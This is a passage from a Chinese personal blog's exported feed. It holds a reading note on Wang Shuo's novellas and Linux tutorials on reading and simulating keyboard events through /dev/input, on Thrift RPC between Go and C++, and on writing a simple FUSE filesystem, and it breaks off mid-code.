<h3 id="动物凶猛"><a href="#动物凶猛" class="headerlink" title="动物凶猛"></a>动物凶猛</h3><p>动物凶猛是被姜文改编为<code>阳光灿烂下的日子</code>，我是先看的电影再读的小说，所以在读这个时候是一边回忆我看电影的角色剧情，一边代入进小说，想<code>米兰</code>是<code>宁静</code>那样的丰满吗到底（笑），年轻的时候总是对异性抱有幻想，到底<code>马小军</code>和<code>米兰</code>发生了这么多故事么？还是都是臆想？我倒是觉得马小军自己一半臆想一半真事，他自己都说不清到底发生了什么，我觉得他对米兰的爱慕是真的，对自己的胆怯也是真的，他哪有这个胆子拿着刀去捅<code>刘忆苦</code>,只不过是在自己16，7岁认识了想<code>米兰</code>这样的性感的人儿，自己发生的幻想，对年轻女生的青少年爱情的憧憬。</p>
<h3 id="顽主"><a href="#顽主" class="headerlink" title="顽主"></a>顽主</h3><p>一看开头我就想起来了葛优的翻拍，还不止翻拍一次10年后还整了一个私人定制，不过我还是觉得第一次拍的顽主是最好的，那个经典的3T公司，为人排忧解难，刚改革开放新一代年轻人不知道干什么，在现有的生活中挣扎想混的有意义，却又不想干正事（笑），搁现在你不得为生活拼搏。3T公司是给小人物一个大人物的梦，可是之后呢，小人物还是得为自己的阶级而奋斗，所有表象,皆为虚妄，只不过是还是常常要做梦，让自己充实，如果不做梦岂不是当现实的努力，生活这么苦，跟个熟透的苦瓜一样，又苦又老，有时候还是得做做梦安慰安慰自己。</p>
<h3 id="过把瘾就死"><a href="#过把瘾就死" class="headerlink" title="过把瘾就死"></a>过把瘾就死</h3><p>杜梅想要一轰轰烈烈的爱情，想作着来，方言不明白，我也不明白，所以我不理解也不评价，只能说文字很有张力，杜梅很绝望</p>
<h3 id="一半是火焰一半是海水"><a href="#一半是火焰一半是海水" class="headerlink" title="一半是火焰一半是海水"></a>一半是火焰一半是海水</h3><p>简单的讲这个就是一个玩仙人跳的渣男，骗炮一个清纯的大学生，大学生对他不离不弃直到自杀，渣男被抓进监狱然后出狱之后幡然醒悟的故事，俗味到掉牙的老套故事。王朔在描述绝望的时候是令人窒息的，很容易把自己带入，俗套的故事不俗套的文字描述，只能说是值得一看。</p>
<h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>他的短篇小说太多了，我一买就买了三本合集，之后的有时间再写吧</p>
<ul>
<li>不要把心爱的东西放在身边,除非有一天你有能力保护它。——王朔《动物凶猛》</li>
<li>人都是顽固不化和自以为是的,相安无事的唯一办法就是欺骗。——王朔《动物凶猛》</li>
<li>越聊我们越觉得我们相识纯属偶然，有太多的因素可以使我们失之交臂。纯粹一念之差，邂逅了，认识了，关系进一步发展了。在此之前，我们能活到与对方相识都是侥幸。疾病、车祸以及种种意外始终威胁、伴随着我们，还有那些危险的人们。——王朔《过把瘾就死》</li>
<li>我可不喜欢什么事都清楚地知道结局，有条不紊地逐次达标，那也太乏味了。多一分远见，就少一分刺激。如果我知道下一步，每一步会碰到什么，产生什么后果，我立刻就没兴趣活了。——王朔《一半是火焰一半是海水》</li>
</ul>
]]></content>
      <categories>
        <category>阅读</category>
      </categories>
      <tags>
        <tag>读书有感</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】UOS下实现键盘事件捕捉</title>
    <url>/2021/06/28/UOS%E4%B8%8B%E5%AE%9E%E7%8E%B0%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6%E6%8D%95%E6%8D%89/</url>
    <content><![CDATA[<h1 id="在UOS系统下实现键盘的捕捉"><a href="#在UOS系统下实现键盘的捕捉" class="headerlink" title="在UOS系统下实现键盘的捕捉"></a>在UOS系统下实现键盘的捕捉</h1><p><em><strong>在UOS系统下监听和触发键盘的事件，具体代码参考<code>https://github.com/MecryWork/hotkey</code>。参考博文<code>https://www.jianshu.com/p/927fc573d081</code></strong></em></p>
<span id="more"></span>

<h2 id="dev-input目录简介"><a href="#dev-input目录简介" class="headerlink" title="/dev/input目录简介"></a>/dev/input目录简介</h2><ol>
<li><p>首先linux是所有操作都是已文件形式处理，这个是真理。在我们输入键盘鼠标时，linux系统中记录都放在<code>/dev/input</code>目录下。我们<code>ls</code>下此目录可以看见绝大部分的事件处理</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crw-rw----  1 root input 13, 65 6月  28 13:04 event1</span><br><span class="line">crw-rw----  1 root input 13, 74 6月  28 13:04 event10</span><br><span class="line">crw-rw----  1 root input 13, 75 6月  28 13:04 event11</span><br><span class="line">crw-rw----  1 root input 13, 76 6月  28 13:04 event12</span><br><span class="line">crw-rw----  1 root input 13, 77 6月  28 13:04 event13</span><br><span class="line">crw-rw----  1 root input 13, 66 6月  28 13:04 event2</span><br><span class="line">crw-rw----  1 root input 13, 67 6月  28 13:04 event3</span><br><span class="line">crw-rw----  1 root input 13, 68 6月  28 13:04 event4</span><br><span class="line">crw-rw----  1 root input 13, 69 6月  28 13:04 event5</span><br><span class="line">crw-rw----  1 root input 13, 70 6月  28 13:04 event6</span><br><span class="line">crw-rw----  1 root input 13, 71 6月  28 13:04 event7</span><br><span class="line">crw-rw----  1 root input 13, 72 6月  28 13:04 event8</span><br><span class="line">crw-rw----  1 root input 13, 73 6月  28 13:04 event9</span><br></pre></td></tr></table></figure></li>
<li><p>使用<code>cat /proc/bus/input/devices</code>可以查看每一个event的具体操作，里面的H就是对应的时间操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I: Bus&#x3D;0000 Vendor&#x3D;0000 Product&#x3D;0000 Version&#x3D;0000</span><br><span class="line">N: Name&#x3D;&quot;HDA ATI HDMI HDMI&#x2F;DP,pcm&#x3D;3&quot;</span><br><span class="line">P: Phys&#x3D;ALSA</span><br><span class="line">S: Sysfs&#x3D;&#x2F;devices&#x2F;pci0000:00&#x2F;0000:00:01.0&#x2F;0000:01:00.1&#x2F;sound&#x2F;card1&#x2F;input11</span><br><span class="line">U: Uniq&#x3D;</span><br><span class="line">H: Handlers&#x3D;event8</span><br><span class="line">B: PROP&#x3D;0</span><br><span class="line">B: EV&#x3D;21</span><br><span class="line">B: SW&#x3D;140</span><br><span class="line"></span><br><span class="line">I: Bus&#x3D;0000 Vendor&#x3D;0000 Product&#x3D;0000 Version&#x3D;0000</span><br><span class="line">N: Name&#x3D;&quot;HDA Intel PCH Rear Mic&quot;</span><br><span class="line">P: Phys&#x3D;ALSA</span><br><span class="line">S: Sysfs&#x3D;&#x2F;devices&#x2F;pci0000:00&#x2F;0000:00:1f.3&#x2F;sound&#x2F;card0&#x2F;input12</span><br><span class="line">U: Uniq&#x3D;</span><br><span class="line">H: Handlers&#x3D;event9</span><br><span class="line">B: PROP&#x3D;0</span><br><span class="line">B: EV&#x3D;21</span><br><span class="line">B: SW&#x3D;10</span><br><span class="line"></span><br><span class="line">I: Bus&#x3D;0000 Vendor&#x3D;0000 Product&#x3D;0000 Version&#x3D;0000</span><br><span class="line">N: Name&#x3D;&quot;HDA Intel PCH Front Mic&quot;</span><br><span class="line">P: Phys&#x3D;ALSA</span><br><span class="line">S: Sysfs&#x3D;&#x2F;devices&#x2F;pci0000:00&#x2F;0000:00:1f.3&#x2F;sound&#x2F;card0&#x2F;input13</span><br><span class="line">U: Uniq&#x3D;</span><br><span class="line">H: Handlers&#x3D;event10</span><br><span class="line">B: PROP&#x3D;0</span><br><span class="line">B: EV&#x3D;21</span><br><span class="line">B: SW&#x3D;10</span><br></pre></td></tr></table></figure>
<h2 id="input-h-文件"><a href="#input-h-文件" class="headerlink" title="input.h 文件"></a>input.h 文件</h2></li>
<li><p>在<code>linux/input.h</code>文件中定义了<code>event</code>时间输入数据的结构图，该结构图的定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">input_event</span> &#123;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">time</span>;</span></span><br><span class="line"> __u16 type;</span><br><span class="line"> __u16 code;</span><br><span class="line"> __s32 value;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line"> <span class="keyword">__time_t</span> tv_sec;        <span class="comment">/* Seconds.  */</span></span><br><span class="line"> <span class="keyword">__suseconds_t</span> tv_usec;  <span class="comment">/* Microseconds.  */</span></span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>
<p> type，指事件类型，常见的事件类型有：</p>
<p> EV_KEY，按键事件，键盘的按键，鼠标的左键右键等；</p>
<p> EV_REL，相对坐标，主要用于鼠标的移动事件；</p>
<p> EV_ABS，绝对坐标，主要用于触摸屏的移动事件。</p>
<p> code 事件代码，当事件类型为EV_KEY时，该代码为设备键盘代码，在input.h文件中以KEY_开头定义；</p>
<p> value 事件的值，当事件类型代码是EV_KEY时，按键操作值为1，释放操作值为0，事件类型代码为EV_REL是，value为正数值和负数值分别代表连个不同方向的值。</p>
</li>
</ol>
<h2 id="监听键盘事件"><a href="#监听键盘事件" class="headerlink" title="监听键盘事件"></a>监听键盘事件</h2><ol>
<li>利用<code>input_event</code>结构体读取键盘事件 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> retval;</span><br><span class="line">fd_set readfds;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line"><span class="keyword">int</span> fd = open(dev, O_RDONLY);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">input_event</span> <span class="title">event</span>;</span></span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(dev);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    FD_ZERO(&amp;readfds);</span><br><span class="line">    FD_SET(fd, &amp;readfds);</span><br><span class="line">    tv.tv_sec = timeout;<span class="comment">//设置超时时间</span></span><br><span class="line">    tv.tv_usec = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((retval = select(fd + <span class="number">1</span>, &amp;readfds, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;tv)) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (read(fd, &amp;event, <span class="keyword">sizeof</span>(event)) == <span class="keyword">sizeof</span>(event)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (event.type == EV_KEY) &#123;</span><br><span class="line">                <span class="keyword">if</span> (event.value == <span class="number">0</span> || event.value == <span class="number">1</span>) <span class="comment">//根据value的值判断按下松开&#123;</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;key %d %s\n&quot;</span>, event.code, event.value ? <span class="string">&quot;Pressed&quot;</span> : <span class="string">&quot;Released&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;type=%x %d %d\n&quot;</span>, event.type, event.code, event.value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="传入键盘事件"><a href="#传入键盘事件" class="headerlink" title="传入键盘事件"></a>传入键盘事件</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 利用`input_event`+`write`对键盘事件进行写入</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">simulate_key</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> kval)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">input_event</span> <span class="title">event</span>;</span></span><br><span class="line">        gettimeofday(&amp;event.time, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//按下kval键</span></span><br><span class="line">        event.type = EV_KEY;</span><br><span class="line">        event.value = <span class="number">1</span>;</span><br><span class="line">        event.code = kval;</span><br><span class="line">        write(fd, &amp;event, <span class="keyword">sizeof</span>(event));</span><br><span class="line">        <span class="comment">//同步，也就是把它报告给系统</span></span><br><span class="line">        event.type = EV_SYN;</span><br><span class="line">        event.value = <span class="number">0</span>;</span><br><span class="line">        event.code = SYN_REPORT;</span><br><span class="line">        write(fd, &amp;event, <span class="keyword">sizeof</span>(event));</span><br><span class="line">        <span class="built_in">memset</span>(&amp;event, <span class="number">0</span>, <span class="keyword">sizeof</span>(event));</span><br><span class="line">        gettimeofday(&amp;event.time, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//松开kval键</span></span><br><span class="line">        event.type = EV_KEY;</span><br><span class="line">        event.value = <span class="number">0</span>;</span><br><span class="line">        event.code = kval;</span><br><span class="line">        write(fd, &amp;event, <span class="keyword">sizeof</span>(event));</span><br><span class="line">        <span class="comment">//同步，也就是把它报告给系统</span></span><br><span class="line">        event.type = EV_SYN;</span><br><span class="line">        event.value = <span class="number">0</span>;</span><br><span class="line">        event.code = SYN_REPORT;</span><br><span class="line">        write(fd, &amp;event, <span class="keyword">sizeof</span>(event));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Linux技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】利用thrift实现跨语言通讯</title>
    <url>/2021/06/17/%E5%88%A9%E7%94%A8thrift%E5%AE%9E%E7%8E%B0%E8%B7%A8%E8%AF%AD%E8%A8%80%E9%80%9A%E8%AE%AF/</url>
    <content><![CDATA[<h1 id="blog的搭建"><a href="#blog的搭建" class="headerlink" title="blog的搭建"></a>blog的搭建</h1><p><em><strong>利用thrift的跨平台机制实现进程通讯，本机是uos系统+go语言，virtualbox是windows系统+C++，在virtualbox上增加端口转发既可实现windows与uos两者不同系统不同语言的进程通讯。</strong></em></p>
<span id="more"></span>


<h2 id="thrift简介"><a href="#thrift简介" class="headerlink" title="thrift简介"></a>thrift简介</h2><h3 id="1-理论知识"><a href="#1-理论知识" class="headerlink" title="1. 理论知识"></a>1. 理论知识</h3><pre><code>Thrift是一种接口描述语言和二进制通讯协议，它被用来定义和创建跨语言的服务。它被当作一个远程过程调用（RPC）框架来使用，是由Facebook为“大规模跨语言服务开发”而开发的。它通过一个代码生成引擎联合了一个软件栈，来创建不同程度的、无缝的跨平台高效服务，可以使用C#、C++（基于POSIX兼容系统）、Cappuccino、Cocoa、Delphi、Erlang、Go、Haskell、Java、Node.js、OCaml、Perl、PHP、Python、Ruby和Smalltalk。虽然它以前是由Facebook开发的，但它现在是Apache软件基金会的开源项目了。该实现被描述在2007年4月的一篇由Facebook发表的技术论文中，该论文现由Apache掌管。
</code></pre>
<h3 id="2-注意事项"><a href="#2-注意事项" class="headerlink" title="2.注意事项"></a>2.注意事项</h3><ol>
<li>Thrift支持的基本数据类型<ul>
<li>byte: 有符号字节</li>
<li>i16: 16 位有符号整数</li>
<li>i32 : 32 位有符号整数</li>
<li>i64: 64 位有符号整数</li>
<li>double : 64 位浮点数</li>
<li>string : 字符串</li>
</ul>
</li>
<li>可用容器类型<ul>
<li>list(t): 元素类型为t的有序表，容许元素重复。</li>
<li>set(t):元素类型为t的无序表，不容许元素重复。对应c++中的set，java中的HashSet,python中的set，php中没有set，则转换为list类型。</li>
<li>map(t,t): 键类型为t，值类型为t的kv对，键不容许重复。对用c++中的map, Java的HashMap, PHP 对应 array, Python/Ruby 的dictionary。</li>
</ul>
</li>
</ol>
<ol start="3">
<li>Thrift 架构（图来自于网络）<br>thrift主要用于各个服务之间的RPC通信，支持跨语言。thrift是一个典型的CS结构，客户端和服务端可以使用不同的语言开发，thrift通过IDL(Interface Description Language)来关联客户端和服务端。thrift的整体架构图如下图所示<br><img src="/2021/06/17/%E5%88%A9%E7%94%A8thrift%E5%AE%9E%E7%8E%B0%E8%B7%A8%E8%AF%AD%E8%A8%80%E9%80%9A%E8%AE%AF/1.png" alt="图1"></li>
</ol>
<h2 id="uos利用go实现thrift的客户端和服务端"><a href="#uos利用go实现thrift的客户端和服务端" class="headerlink" title="uos利用go实现thrift的客户端和服务端"></a>uos利用go实现thrift的客户端和服务端</h2><ol>
<li><p>goland安装thrift包</p>
<blockquote>
<p>go get git.apache.org/thrift.git/lib/go/thrift<br>调用命令<code>thrift -version</code>显示版本号即安装成功。</p>
</blockquote>
</li>
<li><p>下载的文件加入到<code>gopath</code>中</p>
</li>
<li><p>编写属于接口的fuse.thrift的LDL文件，我本地要实现一个剪切板数据互发功能，所以接口为剪切板功能。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">namespace <span class="keyword">go</span> fuse</span><br><span class="line"> service WindowsToUos &#123;</span><br><span class="line">     <span class="comment">//windows 剪切板发送到uos</span></span><br><span class="line">     <span class="keyword">bool</span> sendCliboard(<span class="number">1</span>:i32 nType, <span class="number">2</span>:<span class="keyword">string</span> path);</span><br><span class="line">     void stop();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> service UosToWindows&#123;</span><br><span class="line">     <span class="comment">//uos 剪切板发送到windows</span></span><br><span class="line">     <span class="keyword">bool</span> sendCliboard(<span class="number">1</span>:i32 nType, <span class="number">2</span>:<span class="keyword">string</span> path, <span class="number">3</span>:<span class="keyword">string</span> Vol);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>在service windowstouos中，是windows为客户端，uos为服务端。在uostowindows中，是windows为服务端，uos为客户端。两者可以来回通讯。</p>
</li>
<li><p>运行命令，生成相关代码，目录下就会存在一个gen-go的一个代码文件夹</p>
<blockquote>
<p> thrift -r –gen go fuse.thrift</p>
</blockquote>
</li>
<li><p>服务端接口初始化代码如下,<code>EchoServerImp</code>接口为空接口。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">type</span> EchoServerImp <span class="keyword">struct</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">func</span> <span class="params">(s *Server)</span> <span class="title">ServerStart</span><span class="params">(port <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">protocolFactory := thrift.NewTBinaryProtocolFactoryDefault()</span><br><span class="line">transportFactory := thrift.NewTBufferedTransportFactory(<span class="number">10000000</span>)</span><br><span class="line">serverTransport, err := thrift.NewTServerSocket(<span class="string">&quot;127.0.0.1:9150&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Error!&quot;</span>, err)</span><br><span class="line">	os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handler := &amp;EchoServerImp&#123;&#125;</span><br><span class="line">processor := fuse.NewWindowsToUosProcessor(handler)</span><br><span class="line">server := thrift.NewTSimpleServer4(processor, serverTransport, transportFactory, protocolFactory)</span><br><span class="line">fmt.Println(<span class="string">&quot;thrift server in&quot;</span>, <span class="string">&quot;127.0.0.1:9150&quot;</span>)</span><br><span class="line">server.Serve()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">     <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="comment">//	ListenClipboard()</span></span><br><span class="line">     &#125;()</span><br><span class="line">     ctxT, cancelFunc = context.WithCancel(context.Background())</span><br><span class="line">     sev := &amp;Server&#123;&#125;</span><br><span class="line">     sev.ServerStart(<span class="number">8192</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>在服务端时，需要把LDL的函数实现，不然会报错，逻辑实现代码如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">func</span> <span class="params">(e *EchoServerImp)</span> <span class="title">Stop</span><span class="params">(ctx context.Context)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">logger.Info(<span class="string">&quot;Revice Stop!!!&quot;</span>)</span><br><span class="line">stop()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>客户端接口初始化代码如下。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="keyword">type</span> Manager <span class="keyword">struct</span> &#123;</span><br><span class="line">clipboard <span class="comment">// interface com.deepin.ListenClipboard</span></span><br><span class="line">proxy.Object</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">type</span> ClipboardService <span class="keyword">struct</span> &#123;</span><br><span class="line">     loginManager   *Manager</span><br><span class="line">     sessionSigLoop *dbusutil.SignalLoop</span><br><span class="line">     service        *dbusutil.Service</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">func</span> <span class="title">ListenClipboard</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">     <span class="keyword">var</span> cb ClipboardService</span><br><span class="line">     <span class="comment">//注册剪切板dbus信号</span></span><br><span class="line">     sessionBus, err := dbus.SessionBus()</span><br><span class="line">     <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        logger.Warning(<span class="string">&quot;failed to register clipboard changed signal:&quot;</span>, err)</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">     &#125;</span><br><span class="line">     cb.loginManager = NewCBManager(sessionBus)</span><br><span class="line">     cb.sessionSigLoop = dbusutil.NewSignalLoop(sessionBus, <span class="number">10</span>)</span><br><span class="line">     cb.sessionSigLoop.Start()</span><br><span class="line">     cb.loginManager.InitSignalExt(cb.sessionSigLoop, <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">     <span class="comment">//绑定剪切板变化dbus信号</span></span><br><span class="line">     <span class="comment">//_, err = cb.loginManager.ConnectClipboardChange()qqq+</span></span><br><span class="line">     <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        logger.Warning(<span class="string">&quot;failed to connect clipboard changed signal:&quot;</span>, err)</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>客户端调用服务端代码如下</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">cb.loginManager.SendCliboardToWindows(clipboardType, clipboardData, vol)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="windows利用C-实现thrift的客户端和服务端"><a href="#windows利用C-实现thrift的客户端和服务端" class="headerlink" title="windows利用C++实现thrift的客户端和服务端"></a>windows利用C++实现thrift的客户端和服务端</h2><h2 id="利用virtualbox的端口转发机制，实现windows和uos互相通讯"><a href="#利用virtualbox的端口转发机制，实现windows和uos互相通讯" class="headerlink" title="利用virtualbox的端口转发机制，实现windows和uos互相通讯"></a>利用virtualbox的端口转发机制，实现windows和uos互相通讯</h2>]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>Linux技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】Linux下fuse的实现原理</title>
    <url>/2021/06/07/Linux%E4%B8%8Bfuse%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h1 id="fuse实现原理"><a href="#fuse实现原理" class="headerlink" title="fuse实现原理"></a>fuse实现原理</h1><p><em><strong>本文是对httpdirfs源码的一个学习,源码在<code>https://github.com/fangfufu/httpdirfs</code>.实现在linux系统下利用fuse技术,把http文件服务器挂载至本地路径.</strong></em></p>
<span id="more"></span>

<h2 id="fuse原理"><a href="#fuse原理" class="headerlink" title="fuse原理"></a>fuse原理</h2><ol>
<li><p>流程介绍<br><img src="/2021/06/07/Linux%E4%B8%8Bfuse%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/1.png" alt="图1"></p>
<p> 图中可以看出,fuse和ext3,ntfs都是文件系统模块.我们使用fuse实现文件系统并挂在至/tmp/fuse上,当我们对此目录执行ls命令时,内核的fuse从vfs中获取参数,调用我们自己实现ls的函数,得到结果再从vfs返回至ls.简单来说就是<code>ls-&gt;fuse挂载文件夹-&gt;VFS-&gt;libfuse-&gt;自己实现的函数-&gt;结果返回至ls</code>,demo的源码在<code>https://github.com/MecryWork/Learn-C-to-implement-fuse</code></p>
</li>
<li><p>简单demo</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FUSE_USE_VERSION 26</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fuse.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> ou_re        <span class="title">addir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">void</span>* buf, <span class="keyword">fuse_fill_dir_t</span> filler,</span></span></span><br><span class="line"><span class="function"><span class="params">					<span class="keyword">off_t</span> offset, struct fuse_file_info* fi)</span><span class="comment">//读取目录</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> filler(buf, <span class="string">&quot;hello-world&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ou_getattr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, struct stat* st)</span><span class="comment">//获取状态</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(st, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct stat));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strcmp</span>(path, <span class="string">&quot;/&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">		st-&gt;st_mode = <span class="number">0755</span> | S_IFDIR;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		st-&gt;st_mode = <span class="number">0644</span> | S_IFREG;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">fuse_operations</span> <span class="title">oufs_ops</span> =</span> &#123;<span class="comment">//fuse设置响应函数</span></span><br><span class="line">	.readdir    =   ou_readdir,</span><br><span class="line">	.getattr    =   ou_getattr,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> fuse_main(argc, argv, &amp;oufs_ops, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> cmake编译成功后会看到生成的可执行文件 fusehello。建立一个挂载点 /tmp/mnt，然后运行</p>
<blockquote>
<p>./fusehello /tmp/mnt<br> 成功后试试“ls /tmp/mnt”，就能看到一个文件“hello-world”。要调试的时候可以加上“-d”选项，这样就能看到 FUSE 和自己 printf 的调试输出。代码第一行指定了要使用的 FUSE API 版本。这里使用的是 2.6 版本。</p>
</blockquote>
</li>
<li><p>简单demo2,实现创建/删除普通文件的功能,加了<code>ou_create</code>,和<code>ou_unlink</code>两个函数,在fuse上被调用.</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ou_create</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">mode_t</span> mode, struct fuse_file_info* fi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ou_entry</span>* <span class="title">o</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_node</span>* <span class="title">n</span>;</span><span class="comment">//使用链表,文件放入链表中方便删除增加</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strlen</span>(path + <span class="number">1</span>) &gt; MAX_NAMELEN)</span><br><span class="line">		<span class="keyword">return</span> -ENAMETOOLONG;</span><br><span class="line"></span><br><span class="line">	list_for_each (n, &amp;entries) &#123;</span><br><span class="line">		o = list_entry(n, struct ou_entry, node);</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(path + <span class="number">1</span>, o-&gt;name) == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> -EEXIST;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	o = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct ou_entry));</span><br><span class="line">	<span class="built_in">strcpy</span>(o-&gt;name, path + <span class="number">1</span>); <span class="comment">/* skip leading &#x27;/&#x27; */</span></span><br><span class="line">	o-&gt;mode = mode | S_IFREG;</span><br><span class="line">	